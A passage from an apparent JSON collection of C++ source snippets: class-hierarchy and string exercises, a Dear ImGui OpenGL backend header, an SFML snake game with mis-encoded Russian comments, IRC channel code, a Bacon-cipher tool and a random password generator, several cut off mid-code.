l.pHead;\n\t\twhile (q->next != NULL)\n\t\t{\n\t\t\tq = q->next;\n\t\t}\n\t\tq->next = p;\n\t}\n}",
    "#include <iostream>\n#include <cstring>\n\nclass DomesticAnimal {\nprotected:\n    std::string name;\n    std::string characteristics;\n\npublic:\n    DomesticAnimal(const std::string& _name, const std::string& _characteristics)\n        : name(_name), characteristics(_characteristics) {}\n\n    void displayInfo() const {\n        std::cout << \"Name: \" << name << \", Characteristics: \" << characteristics << std::endl;\n    }\n};\n\nclass Dog : public DomesticAnimal {\npublic:\n    Dog(const std::string& _name, const std::string& _characteristics)\n        : DomesticAnimal(_name, _characteristics) {}\n};\n\nclass Cat : public DomesticAnimal {\npublic:\n    Cat(const std::string& _name, const std::string& _characteristics)\n        : DomesticAnimal(_name, _characteristics) {}\n};\n\nclass Parrot : public DomesticAnimal {\npublic:\n    Parrot(const std::string& _name, const std::string& _characteristics)\n        : DomesticAnimal(_name, _characteristics) {}\n};\n\nclass String {\nprotected:\n    char* str;\n    int length;\n\npublic:\n    String() : str(nullptr), length(0) {}\n\n    String(const char* s) {\n        length = strlen(s);\n        str = new char[length + 1];\n        for (int i = 0; i <= length; ++i) {\n            str[i] = s[i];\n        }\n    }\n\n    String(const String& other) {\n        length = other.length;\n        str = new char[length + 1];\n        for (int i = 0; i <= length; ++i) {\n            str[i] = other.str[i];\n        }\n    }\n\n    String& operator=(const String& other) {\n        if (this == &other)\n            return *this;\n\n        delete[] str;\n        length = other.length;\n        str = new char[length + 1];\n        for (int i = 0; i <= length; ++i) {\n            str[i] = other.str[i];\n        }\n        return *this;\n    }\n\n    ~String() {\n        delete[] str;\n    }\n\n    int getLength() const {\n        return length;\n    }\n\n    void clear() {\n        delete[] str;\n        str = nullptr;\n        length = 0;\n    }\n    String operator+(const String& other) const {\n        String temp;\n        temp.length = length + other.length;\n        temp.str = new char[temp.length + 1];\n        for (int i = 0; i < length; ++i) {\n            temp.str[i] = str[i];\n        }\n        for (int i = 0; i <= other.length; ++i) {\n            temp.str[length + i] = other.str[i];\n        }\n        return temp;\n    }\n    String& operator+=(const String& other) {\n        *this = *this + other;\n        return *this;\n    }\n    bool operator==(const String& other) const {\n        return strcmp(str, other.str) == 0;\n    }\n    bool operator!=(const String& other) const {\n        return !(*this == other);\n    }\n};\n\nclass BitString : public String {\npublic:\n    BitString() : String() {}\n\n    BitString(const char* s) {\n        bool isValid = true;\n        for (int i = 0; s[i] != '\\0'; ++i) {\n            if (s[i] != '0' && s[i] != '1') {\n                isValid = false;\n                break;\n            }\n        }\n\n        if (isValid) {\n            length = strlen(s);\n            str = new char[length + 1];\n            for (int i = 0; i <= length; ++i) {\n                str[i] = s[i];\n            }\n        }\n        else {\n            str = new char[1];\n            str[0] = '\\0';\n            length = 0;\n        }\n    }\n\n    BitString(const String& other) : String(other) {}\n\n    BitString& operator=(const String& other) {\n        String::operator=(other);\n        return *this;\n    }\n    bool operator==(const BitString& other) const {\n        return strcmp(str, other.str) == 0;\n    }\n    bool operator!=(const BitString& other) const {\n        return !(*this == other);\n    }\n};\n\nint main() {\n    Dog dog(\"Buddy\", \"Loyal\");\n    Cat cat(\"Whiskers\", \"Independent\");\n    Parrot parrot(\"Polly\", \"Talkative\");\n\n    dog.displayInfo();\n    cat.displayInfo();\n    parrot.displayInfo();\n\n    BitString bitString(\"10101010\");\n    BitString anotherBitString(\"20202020\");\n\n    return 0;\n}\n",
    "// dear imgui: Renderer Backend for modern OpenGL with shaders / programmatic pipeline\n// - Desktop GL: 2.x 3.x 4.x\n// - Embedded GL: ES 2.0 (WebGL 1.0), ES 3.0 (WebGL 2.0)\n// This needs to be used along with a Platform Backend (e.g. GLFW, SDL, Win32, custom..)\n\n// Implemented features:\n//  [X] Renderer: User texture binding. Use 'GLuint' OpenGL texture identifier as void*/ImTextureID. Read the FAQ about ImTextureID!\n//  [x] Renderer: Large meshes support (64k+ vertices) with 16-bit indices (Desktop OpenGL only).\n\n// About WebGL/ES:\n// - You need to '#define IMGUI_IMPL_OPENGL_ES2' or '#define IMGUI_IMPL_OPENGL_ES3' to use WebGL or OpenGL ES.\n// - This is done automatically on iOS, Android and Emscripten targets.\n// - For other targets, the define needs to be visible from the imgui_impl_opengl3.cpp compilation unit. If unsure, define globally or in imconfig.h.\n\n// You can use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\n// Learn about Dear ImGui:\n// - FAQ                  https://dearimgui.com/faq\n// - Getting Started      https://dearimgui.com/getting-started\n// - Documentation        https://dearimgui.com/docs (same as your local docs/ folder).\n// - Introduction, links and more at the top of imgui.cpp\n\n// CHANGELOG\n// (minor and older changes stripped away, please see git history for details)\n//  2024-05-07: OpenGL: Update loader for Linux to support EGL/GLVND. (#7562)\n//  2024-04-16: OpenGL: Detect ES3 contexts on desktop based on version string, to e.g. avoid calling glPolygonMode() on them. (#7447)\n//  2024-01-09: OpenGL: Update GL3W based imgui_impl_opengl3_loader.h to load \"libGL.so\" and variants, fixing regression on distros missing a symlink.\n//  2023-11-08: OpenGL: Update GL3W based imgui_impl_opengl3_loader.h to load \"libGL.so\" instead of \"libGL.so.1\", accommodating for NetBSD systems having only \"libGL.so.3\" available. (#6983)\n//  2023-10-05: OpenGL: Rename symbols in our internal loader so that LTO compilation with another copy of gl3w is possible. (#6875, #6668, #4445)\n//  2023-06-20: OpenGL: Fixed erroneous use glGetIntegerv(GL_CONTEXT_PROFILE_MASK) on contexts lower than 3.2. (#6539, #6333)\n//  2023-05-09: OpenGL: Support for glBindSampler() backup/restore on ES3. (#6375)\n//  2023-04-18: OpenGL: Restore front and back polygon mode separately when supported by context. (#6333)\n//  2023-03-23: OpenGL: Properly restoring \"no shader program bound\" if it was the case prior to running the rendering function. (#6267, #6220, #6224)\n//  2023-03-15: OpenGL: Fixed GL loader crash when GL_VERSION returns NULL. (#6154, #4445, #3530)\n//  2023-03-06: OpenGL: Fixed restoration of a potentially deleted OpenGL program, by calling glIsProgram(). (#6220, #6224)\n//  2022-11-09: OpenGL: Reverted use of glBufferSubData(), too many corruptions issues + old issues seemingly can't be reproed with Intel drivers nowadays (revert 2021-12-15 and 2022-05-23 changes).\n//  2022-10-11: Using 'nullptr' instead of 'NULL' as per our switch to C++11.\n//  2022-09-27: OpenGL: Added ability to '#define IMGUI_IMPL_OPENGL_DEBUG'.\n//  2022-05-23: OpenGL: Reworking 2021-12-15 \"Using buffer orphaning\" so it only happens on Intel GPU, seems to cause problems otherwise. (#4468, #4825, #4832, #5127).\n//  2022-05-13: OpenGL: Fixed state corruption on OpenGL ES 2.0 due to not preserving GL_ELEMENT_ARRAY_BUFFER_BINDING and vertex attribute states.\n//  2021-12-15: OpenGL: Using buffer orphaning + glBufferSubData(), seems to fix leaks with multi-viewports with some Intel HD drivers.\n//  2021-08-23: OpenGL: Fixed ES 3.0 shader (\"#version 300 es\") use normal precision floats to avoid wobbly rendering at HD resolutions.\n//  2021-08-19: OpenGL: Embed and use our own minimal GL loader (imgui_impl_opengl3_loader.h), removing requirement and support for third-party loader.\n//  2021-06-29: Reorganized backend to pull data from a single structure to facilitate usage with multiple-contexts (all g_XXXX access changed to bd->XXXX).\n//  2021-06-25: OpenGL: Use OES_vertex_array extension on Emscripten + backup/restore current state.\n//  2021-06-21: OpenGL: Destroy individual vertex/fragment shader objects right after they are linked into the main shader.\n//  2021-05-24: OpenGL: Access GL_CLIP_ORIGIN when \"GL_ARB_clip_control\" extension is detected, inside of just OpenGL 4.5 version.\n//  2021-05-19: OpenGL: Replaced direct access to ImDrawCmd::TextureId with a call to ImDrawCmd::GetTexID(). (will become a requirement)\n//  2021-04-06: OpenGL: Don't try to read GL_CLIP_ORIGIN unless we're OpenGL 4.5 or greater.\n//  2021-02-18: OpenGL: Change blending equation to preserve alpha in output buffer.\n//  2021-01-03: OpenGL: Backup, setup and restore GL_STENCIL_TEST state.\n//  2020-10-23: OpenGL: Backup, setup and restore GL_PRIMITIVE_RESTART state.\n//  2020-10-15: OpenGL: Use g",
    "#include <SFML/Graphics.hpp>\n#include <iostream>\n#include <ctime>\n#include <cstdlib>\n\nusing namespace sf;\nusing namespace std;\n\n// \u00ca\u00ee\u00ed\u00f1\u00f2\u00e0\u00ed\u00f2\u00fb \u00e4\u00eb\u00ff \u00f0\u00e0\u00e7\u00ec\u00e5\u00f0\u00e0 \u00e8\u00e3\u00f0\u00ee\u00e2\u00ee\u00e3\u00ee \u00ef\u00ee\u00eb\u00ff \u00e8 \u00ec\u00e0\u00f1\u00f8\u00f2\u00e0\u00e1\u00e0 \u00e3\u00f0\u00e0\u00f4\u00e8\u00ea\u00e8\nconst int width = 20;\nconst int height = 20;\nconst int scale = 40;\n\n// \u00cf\u00ee\u00e7\u00e8\u00f6\u00e8\u00e8 \u00e7\u00ec\u00e5\u00e9\u00ea\u00e8 \u00e8 \u00f4\u00f0\u00f3\u00ea\u00f2\u00e0, \u00e4\u00eb\u00e8\u00ed\u00e0 \u00f5\u00e2\u00ee\u00f1\u00f2\u00e0\nint x, y;\nint fruitX, fruitY;\nint nTail;\nconst int maxTailLength = 100;\nint tailX[maxTailLength], tailY[maxTailLength];\n\n// \u00d1\u00ea\u00ee\u00f0\u00ee\u00f1\u00f2\u00fc \u00e8\u00e3\u00f0\u00fb \u00e8 \u00f1\u00f7\u00e5\u00f2\nint speed;\nint score;\nbool gameOver;\n\n// \u00cd\u00e0\u00ef\u00f0\u00e0\u00e2\u00eb\u00e5\u00ed\u00e8\u00ff \u00e4\u00e2\u00e8\u00e6\u00e5\u00ed\u00e8\u00ff \u00e7\u00ec\u00e5\u00e9\u00ea\u00e8\nenum eDirection { STOP = 0, LEFT, RIGHT, UP, DOWN };\neDirection dir;\n\n// \u00c8\u00ed\u00e8\u00f6\u00e8\u00e0\u00eb\u00e8\u00e7\u00e0\u00f6\u00e8\u00ff \u00e8\u00e3\u00f0\u00fb\nvoid Setup(int difficulty) {\n    gameOver = false;\n    dir = STOP;\n    x = width / 2;\n    y = height / 2;\n    fruitX = rand() % width;\n    fruitY = rand() % height;\n    score = 0;\n    nTail = 0;\n\n    // \u00cd\u00e0\u00f1\u00f2\u00f0\u00ee\u00e9\u00ea\u00e0 \u00f1\u00ea\u00ee\u00f0\u00ee\u00f1\u00f2\u00e8 \u00e2 \u00e7\u00e0\u00e2\u00e8\u00f1\u00e8\u00ec\u00ee\u00f1\u00f2\u00e8 \u00ee\u00f2 \u00e2\u00fb\u00e1\u00f0\u00e0\u00ed\u00ed\u00ee\u00e3\u00ee \u00f3\u00f0\u00ee\u00e2\u00ed\u00ff \u00f1\u00eb\u00ee\u00e6\u00ed\u00ee\u00f1\u00f2\u00e8\n    switch (difficulty) {\n    case 1:\n        speed = 150;\n        break;\n    case 2:\n        speed = 100;\n        break;\n    case 3:\n        speed = 50;\n        break;\n    }\n}\n\n// \u00ce\u00f2\u00f0\u00e8\u00f1\u00ee\u00e2\u00ea\u00e0 \u00e2\u00f1\u00e5\u00f5 \u00fd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\u00ee\u00e2 \u00e8\u00e3\u00f0\u00fb\nvoid Draw(RenderWindow& window, Sprite& background, Sprite& snakeHead, Sprite& snakeTail, Sprite& fruit, Text& scoreText, Text& gameOverText, Text& againText, Text& exitText) {\n    window.clear();\n    window.draw(background);\n\n    // \u00ce\u00f2\u00f0\u00e8\u00f1\u00ee\u00e2\u00ea\u00e0 \u00f5\u00e2\u00ee\u00f1\u00f2\u00e0 \u00e7\u00ec\u00e5\u00e9\u00ea\u00e8\n    for (int i = 0; i < nTail; i++) {\n        snakeTail.setPosition(tailX[i] * scale, tailY[i] * scale);\n        window.draw(snakeTail);\n    }\n\n    // \u00ce\u00f2\u00f0\u00e8\u00f1\u00ee\u00e2\u00ea\u00e0 \u00e3\u00ee\u00eb\u00ee\u00e2\u00fb \u00e7\u00ec\u00e5\u00e9\u00ea\u00e8\n    snakeHead.setPosition(x * scale + scale / 2, y * scale + scale / 2);\n    window.draw(snakeHead);\n\n    // \u00ce\u00f2\u00f0\u00e8\u00f1\u00ee\u00e2\u00ea\u00e0 \u00f4\u00f0\u00f3\u00ea\u00f2\u00e0\n    fruit.setPosition(fruitX * scale, fruitY * scale);\n    window.draw(fruit);\n\n    // \u00ce\u00f2\u00ee\u00e1\u00f0\u00e0\u00e6\u00e5\u00ed\u00e8\u00e5 \u00f1\u00f7\u00e5\u00f2\u00e0\n    scoreText.setString(\"Score: \" + to_string(score));\n    window.draw(scoreText);\n\n    // \u00ce\u00f2\u00ee\u00e1\u00f0\u00e0\u00e6\u00e5\u00ed\u00e8\u00e5 \u00f1\u00ee\u00ee\u00e1\u00f9\u00e5\u00ed\u00e8\u00e9 \u00ef\u00ee\u00f1\u00eb\u00e5 \u00e7\u00e0\u00e2\u00e5\u00f0\u00f8\u00e5\u00ed\u00e8\u00ff \u00e8\u00e3\u00f0\u00fb\n    if (gameOver) {\n        window.draw(gameOverText);\n        window.draw(againText);\n        window.draw(exitText);\n    }\n\n    window.display();\n}\n\n// \u00ce\u00e1\u00f0\u00e0\u00e1\u00ee\u00f2\u00ea\u00e0 \u00e2\u00e2\u00ee\u00e4\u00e0 \u00f1 \u00ea\u00eb\u00e0\u00e2\u00e8\u00e0\u00f2\u00f3\u00f0\u00fb\nvoid Input() {\n    if (Keyboard::isKeyPressed(Keyboard::Left) && dir != RIGHT)\n        dir = LEFT;\n    else if (Keyboard::isKeyPressed(Keyboard::Right) && dir != LEFT)\n        dir = RIGHT;\n    else if (Keyboard::isKeyPressed(Keyboard::Up) && dir != DOWN)\n        dir = UP;\n    else if (Keyboard::isKeyPressed(Keyboard::Down) && dir != UP)\n        dir = DOWN;\n    else if (Keyboard::isKeyPressed(Keyboard::Escape))\n        gameOver = true;\n}\n\n// \u00cf\u00f0\u00ee\u00e2\u00e5\u00f0\u00ea\u00e0 \u00e7\u00e0\u00ed\u00ff\u00f2\u00ee\u00f1\u00f2\u00e8 \u00ea\u00eb\u00e5\u00f2\u00ea\u00e8\nbool IsCellOccupied() {\n    for (int i = 0; i < nTail; i++) {\n        if (tailX[i] == fruitX && tailY[i] == fruitY)\n            return true;\n    }\n    if (fruitX == x && fruitY == y)\n        return true;\n    return false;\n}\n\n// \u00c3\u00e5\u00ed\u00e5\u00f0\u00e0\u00f6\u00e8\u00ff \u00ed\u00ee\u00e2\u00ee\u00e3\u00ee \u00f4\u00f0\u00f3\u00ea\u00f2\u00e0\nvoid GenerateNewFruit() {\n    do {\n        fruitX = rand() % width;\n        fruitY = rand() % height;\n    } while (IsCellOccupied());\n}\n\n// \u00cb\u00ee\u00e3\u00e8\u00ea\u00e0 \u00e8\u00e3\u00f0\u00fb\nvoid Logic() {\n    // \u00ce\u00e1\u00ed\u00ee\u00e2\u00eb\u00e5\u00ed\u00e8\u00e5 \u00f5\u00e2\u00ee\u00f1\u00f2\u00e0 \u00e7\u00ec\u00e5\u00e9\u00ea\u00e8\n    int prevX = tailX[nTail - 1];\n    int prevY = tailY[nTail - 1];\n    for (int i = nTail - 1; i > 0; i--) {\n        tailX[i] = tailX[i - 1];\n        tailY[i] = tailY[i - 1];\n    }\n    tailX[0] = x;\n    tailY[0] = y;\n\n    // \u00cf\u00f0\u00ee\u00e2\u00e5\u00f0\u00ea\u00e0 \u00f1\u00fa\u00e5\u00e4\u00e5\u00ed\u00e8\u00ff \u00f4\u00f0\u00f3\u00ea\u00f2\u00e0\n    if (x == fruitX && y == fruitY) {\n        score += 1;\n        if (nTail < maxTailLength) {\n            nTail++;\n            tailX[nTail - 1] = prevX;\n            tailY[nTail - 1] = prevY;\n            GenerateNewFruit();\n            if (speed > 10)\n                speed -= 5;\n        }\n    }\n\n    // \u00ce\u00e1\u00ed\u00ee\u00e2\u00eb\u00e5\u00ed\u00e8\u00e5 \u00ef\u00ee\u00e7\u00e8\u00f6\u00e8\u00e8 \u00e3\u00ee\u00eb\u00ee\u00e2\u00fb \u00e7\u00ec\u00e5\u00e9\u00ea\u00e8 \u00e2 \u00e7\u00e0\u00e2\u00e8\u00f1\u00e8\u00ec\u00ee\u00f1\u00f2\u00e8 \u00ee\u00f2 \u00ed\u00e0\u00ef\u00f0\u00e0\u00e2\u00eb\u00e5\u00ed\u00e8\u00ff\n    switch (dir) {\n    case LEFT:\n        x--;\n        break;\n    case RIGHT:\n        x++;\n        break;\n    case UP:\n        y--;\n        break;\n    case DOWN:\n        y++;\n        break;\n    }\n\n    // \u00cf\u00f0\u00ee\u00e2\u00e5\u00f0\u00ea\u00e0 \u00e2\u00fb\u00f5\u00ee\u00e4\u00e0 \u00e7\u00e0 \u00e3\u00f0\u00e0\u00ed\u00e8\u00f6\u00fb \u00e8\u00e3\u00f0\u00ee\u00e2\u00ee\u00e3\u00ee \u00ef\u00ee\u00eb\u00ff\n    if (x >= width)\n        x = 0;\n    else if (x < 0)\n        x = width - 1;\n    if (y >= height)\n        y = 0;\n    else if (y < 0)\n        y = height - 1;\n\n    // \u00cf\u00f0\u00ee\u00e2\u00e5\u00f0\u00ea\u00e0 \u00f1\u00f2\u00ee\u00eb\u00ea\u00ed\u00ee\u00e2\u00e5\u00ed\u00e8\u00ff \u00f1 \u00f5\u00e2\u00ee\u00f1\u00f2\u00ee\u00ec\n    for (int i = 0; i < nTail; i++) {\n        if (tailX[i] == x && tailY[i] == y) {\n            gameOver = true;\n            return;\n        }\n    }\n}\n\n// \u00cd\u00e0\u00f7\u00e0\u00eb\u00fc\u00ed\u00ee\u00e5 \u00ec\u00e5\u00ed\u00fe \u00e8\u00e3\u00f0\u00fb\nint StartMenu(RenderWindow& window) {\n    Font font;\n    if (!font.loadFromFile(\"arial.ttf\")) {\n        cerr << \"Font loading error\" << endl;\n        return -1;\n    }\n\n    Text title(\"Snake Game\", font, 60);\n    title.setFillColor(Color::Green);\n    title.setPosition(250, 100);\n\n    Text start(\"Start Game\", font, 40);\n    start.setFillColor(Color::White);\n    start.setPosition(100, 250);\n\n    Text exit(\"Exit\", font, 40);\n    exit.setFillColor(Color::White);\n    exit.setPosition(100, 350);\n\n    Text* options[] = { &start, &exit };\n    int selected = 0;\n\n    // \u00ce\u00e1\u00f0\u00e0\u00e1\u00ee\u00f2\u00ea\u00e0 \u00e2\u00e2\u00ee\u00e4\u00e0 \u00e2 \u00ec\u00e5\u00ed\u00fe\n    while (true) {\n        Event event;\n        while (window.pollEvent(event)) {\n            if (event.type == Event::Closed) {\n                window.close();\n                return -1;\n      ",
    "#include \"../include/channels.hpp\"\n\nChannels::Channels(std::string name): name(name)\n{\n}\n\nChannels::Channels()\n{\n}\n\nvoid print(std::vector<int> v)\n{\n    std::cout << \"-----------------\\n\";\n    for (size_t i = 0; i < v.size(); i++)\n        std::cout << v[i] << std::endl;\n    std::cout << \"-----------------\\n\";\n}\n\nvoid Channels::join(int clientFd, Client *client)\n{\n    // print(ClientssHouse);\n    // Send JOIN message to the client;\n    if(std::find(ClientssHouse.begin(), ClientssHouse.end(), clientFd) == ClientssHouse.end())\n    {\n        std::string rpl = REPLY_JOIN(client->get_nickname(), client->get_username(), name, \"localhost\");\n        ClientssHouse.push_back(clientFd);\n        if(send(clientFd, rpl.c_str(), rpl.length(), 0) == -1)\n            throw std::runtime_error(\"Failed Send JOIN message to the client\");\n    }\n    else\n    {\n        std::string msg = ERROR_ALREADYREGISTERED(client->get_nickname(), getChannelName());\n        if (send(clientFd, msg.c_str(), msg.length(), 0) == -1)\n            throw std::runtime_error(\"Failed Send JOIN message to the client\");\n    }\n\n}\n\n\nstd::string Channels::getChannelName()\n{\n    return(name);\n}\n\nChannels::~Channels()\n{\n\n}\n\nChannels::Channels(const Channels& copy) {\n    name = copy.name;\n    for(size_t i = 0; i < ClientssHouse.size(); i++)\n        ClientssHouse[i] = copy.ClientssHouse[i];\n}\n",
    "#include \"Read.h\"\n#include <iostream>\n#include <string>\n#include <fstream>\n\nusing namespace std;\n\n\nstring encryptBaconian(const string& plaintext) {\n    string ciphertext;\n    for (char c : plaintext) {\n        for (int i = 7; i >= 0; --i) {\n            ciphertext += ((c >> i) & 1) ? 'b' : 'a';\n        }\n    }\n    return ciphertext;\n}\n\nstring decryptBaconian(const string& ciphertext) {\n    string plaintext;\n    try {\n        for (size_t i = 0; i < ciphertext.length(); i += 8) {\n            if (i + 7 >= ciphertext.length()) {\n                throw out_of_range(\"\u0417\u0430\u0448\u0438\u0444\u0440\u043e\u0432\u0430\u043d\u043d\u044b\u0439 \u0442\u0435\u043a\u0441\u0442 \u043d\u0435 \u0434\u043e\u043b\u0436\u0435\u043d \u0431\u044b\u0442\u044c \u043a\u0440\u0430\u0442\u0435\u043d 8 \u0441\u0438\u043c\u0432\u043e\u043b\u0430\u043c\");\n            }\n            char ch = 0;\n            for (int j = 0; j < 8; ++j) {\n                if (ciphertext[i + j] != 'a' && ciphertext[i + j] != 'b') {\n                    throw invalid_argument(\"\u0417\u0430\u0448\u0438\u0444\u0440\u043e\u0432\u0430\u043d\u043d\u044b\u0439 \u0442\u0435\u043a\u0441\u0442 \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \u043d\u0435\u0434\u043e\u043f\u0443\u0441\u0442\u0438\u043c\u044b\u0435 \u0441\u0438\u043c\u0432\u043e\u043b\u044b\");\n                }\n                ch = (ch << 1) | (ciphertext[i + j] == 'b');\n            }\n            plaintext += ch;\n        }\n    }\n    catch (const exception& e) {\n        cerr << \"Error: \" << e.what() << endl;\n        return \"\";\n    }\n    return plaintext;\n}\n\nvoid Bacon(string& password1, string& password2) {\n    int pick, pickencode;\n    string pass1, pass2, message, filename, encryptedFilename, decryptedFilename;\n\n    while (true) {\n       \n        cout << \"______Bacon Cipher_____\" << endl;\n        cout << \"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u0435:\" << endl;\n        cout << \"<1> \u0417\u0430\u0448\u0438\u0444\u0440\u043e\u0432\u0430\u0442\u044c\" << endl;\n        cout << \"<2> \u0414\u0435\u0448\u0438\u0444\u0440\u043e\u0432\u0430\u0442\u044c\" << endl;\n        cout << \"<3> \u0412\u044b\u0445\u043e\u0434\" << endl;\n        cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0441\u0432\u043e\u0439 \u0432\u044b\u0431\u043e\u0440:\" << endl;\n        cout << \"______________________\" << endl;\n        cin >> pick;\n\n        try {\n            if (pick != 1 && pick != 2 && pick != 3) {\n                throw logic_error(\"\u0412\u044b \u0432\u0432\u0435\u043b\u0438 \u043d\u0435\u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u0443\u044e \u043a\u043e\u043c\u0430\u043d\u0434\u0443!\");\n            }\n\n            if (pick == 1) {\n                system(\"cls\");\n                cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0430\u0440\u043e\u043b\u044c \u0434\u043b\u044f \u043a\u043e\u0434\u0438\u0440\u043e\u0432\u043a\u0438: \";\n                cin >> pass1;\n                system(\"cls\");\n                if (pass1 == password1) {\n                    cout << \"\u0412\u0445\u043e\u0434\u043d\u043e\u0435 \u0434\u0435\u0439\u0441\u0442\u0432\u0438\u0435:\" << endl\n                        << \"<1> \u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0442\u0435\u043a\u0441\u0442 \u0441 \u043a\u043e\u043d\u0441\u043e\u043b\u0438\" << endl\n                        << \"<2> \u0427\u0442\u0435\u043d\u0438\u0435 \u0442\u0435\u043a\u0441\u0442\u0430 \u0438\u0437 \u0444\u0430\u0439\u043b\u0430\" << endl;\n                    cin >> pickencode;\n                    if (cin.fail() || cin.peek() != '\\n') {\n                        throw logic_error(\"\u041e\u0448\u0438\u0431\u043a\u0430 \u0432\u0432\u043e\u0434\u0430!\");\n                    }\n                    if (pickencode != 1 && pickencode != 2) {\n                        throw logic_error(\"\u0412\u044b \u0432\u0432\u0435\u043b\u0438 \u043d\u0435\u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u0443\u044e \u043a\u043e\u043c\u0430\u043d\u0434\u0443!\");\n                    }\n                    if (pickencode == 1) {\n                        cout << \"\u0412\u0432\u043e\u0434 \u0442\u0435\u043a\u0441\u0442\u0430: \";\n                        cin.ignore(); // \u041e\u0447\u0438\u0441\u0442\u043a\u0430 \u0431\u0443\u0444\u0435\u0440\u0430 \u0432\u0432\u043e\u0434\u0430\n                        getline(cin, message);\n\n                        string originalFilename = \"Backon_original_input.txt\";\n                        writeToFile(originalFilename, message); // \u0417\u0430\u043f\u0438\u0441\u044c \u0432\u0432\u0435\u0434\u0435\u043d\u043d\u043e\u0433\u043e \u0442\u0435\u043a\u0441\u0442\u0430 \u0432 \u0444\u0430\u0439\u043b\n                        cout << \"\u0412\u0432\u0435\u0434\u0435\u043d\u043d\u044b\u0439 \u0442\u0435\u043a\u0441\u0442 \u0441\u043e\u0445\u0440\u0430\u043d\u0435\u043d \u0432 \u0444\u0430\u0439\u043b: \" << originalFilename << endl;\n\n                        string ciphertext = encryptBaconian(message);\n                        string encryptedFilename = \"encrypted_baconian.txt\";\n                        writeToFile(encryptedFilename, ciphertext); // \u0417\u0430\u043f\u0438\u0441\u044c \u0437\u0430\u0448\u0438\u0444\u0440\u043e\u0432\u0430\u043d\u043d\u043e\u0433\u043e \u0442\u0435\u043a\u0441\u0442\u0430 \u0432 \u0444\u0430\u0439\u043b\n                        cout << \"\u0417\u0430\u0448\u0438\u0444\u0440\u043e\u0432\u0430\u043d\u043d\u044b\u0439 \u0442\u0435\u043a\u0441\u0442, \u0441\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u043d\u044b\u0439 \u0432: \" << encryptedFilename << endl;\n                        \n                        \n                    }\n\n                    else if (pickencode == 2) {\n                        system(\"cls\");\n                        \n                        cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0438\u043c\u044f \u0444\u0430\u0439\u043b\u0430 \u0441 \u0440\u0430\u0441\u0448\u0438\u0440\u0435\u043d\u0438\u0435\u043c:\";\n                        cin >> filename;\n                       \n                        if (!exist(filename)) {\n                            throw logic_error(\"\u0424\u0430\u0439\u043b \u043d\u0435 \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u0435\u0442 \u0438\u043b\u0438 \u043d\u0435 \u043c\u043e\u0436\u0435\u0442 \u0431\u044b\u0442\u044c \u043e\u0442\u043a\u0440\u044b\u0442!\");\n                        }\n\n                        string plaintext = readFromFile(filename);\n                        string ciphertext = encryptBaconian(plaintext);\n                       \n                        encryptedFilename = \"encrypted_baconian.txt\";\n                        writeToFile(encryptedFilename, ciphertext); // \u0417\u0430\u043f\u0438\u0441\u044c \u0437\u0430\u0448\u0438\u0444\u0440\u043e\u0432\u0430\u043d\u043d\u043e\u0433\u043e \u0442\u0435\u043a\u0441\u0442\u0430 \u0432 \u0444\u0430\u0439\u043b\n                        cout << \"\u0417\u0430\u0448\u0438\u0444\u0440\u043e\u0432\u0430\u043d\u043d\u044b\u0439 \u0442\u0435\u043a\u0441\u0442, \u0441\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u043d\u044b\u0439 \u0432: \" << encryptedFilename << endl;\n                        \n                        \n                    }\n                }\n                else {\n                    throw logic_error(\"\u041d\u0435\u0432\u0435\u0440\u043d\u044b\u0439 \u043f\u0430\u0440\u043e\u043b\u044c \u0434\u043b\u044f \u043a\u043e\u0434\u0438\u0440\u043e\u0432\u043a\u0438\");\n                }\n            }\n            \n            else if (pick == 2) {\n                system(\"cls\");\n                cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0430\u0440\u043e\u043b\u044c \u0434\u043b\u044f \u0440\u0430\u0441\u0448\u0438\u0444\u0440\u043e\u0432\u043a\u0438: \";\n                cin >> pass2;\n                \n                if (pass2 == password2) {\n                    cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u0430\u0437\u0432\u0430\u043d\u0438\u0435 \u0444\u0430\u0439\u043b\u0430 \u0441 \u0437\u0430\u0448\u0438\u0444\u0440\u043e\u0432\u0430\u043d\u043d\u044b\u043c \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435\u043c: \";\n                    cin >> filename;\n\n                    if (!exist(filename)) {\n                        throw logic_error(\"\u0424\u0430\u0439\u043b \u043d\u0435 \u0441\u0443\u0449\u0435\u0441",
    "#include <iostream>\n#include <string>\n#include <cctype>\n#include <stdexcept>\n#include <random>\n\nstatic const std::string LETTERS = \"qwertyuiopasdfghjklzxcvbnm\";\nstatic const std::string NUMBERS = \"0123456789\";\n\nstd::string process(const unsigned int &size, bool letters, bool numbers)\n{\n  std::random_device rd;\n  std::mt19937 gen(rd());\n\n  std::uniform_int_distribution<> letter_dist(0, LETTERS.size() - 1);\n  std::uniform_int_distribution<> number_dist(0, NUMBERS.size() - 1);\n  std::uniform_int_distribution<> letter_or_number_dist(0, 1);\n  std::uniform_int_distribution<> case_dist(0, 1);\n\n  std::string output;\n\n  for (std::size_t i = 0; i < size; ++i)\n  {\n    bool use_letter = letters && (!numbers || !letter_or_number_dist(gen));\n\n    if (use_letter)\n    {\n      char letter = LETTERS[letter_dist(gen)];\n      if (case_dist(gen))\n      {\n        letter = std::toupper(letter);\n      }\n      output += letter;\n      continue;\n    }\n\n    if (numbers)\n    {\n      output += NUMBERS[number_dist(gen)];\n    }\n  }\n\n  return output;\n}\n\nint main(int argc, char *argv[])\n{\n  try\n  {\n    if (argc != 3)\n    {\n      throw std::invalid_argument(\"Invalid number of arguments.\");\n    }\n\n    const std::string option = argv[1];\n    const unsigned int size = std::stoi(argv[2]);\n\n    if (option == \"-\")\n    {\n      std::cout << process(size, true, 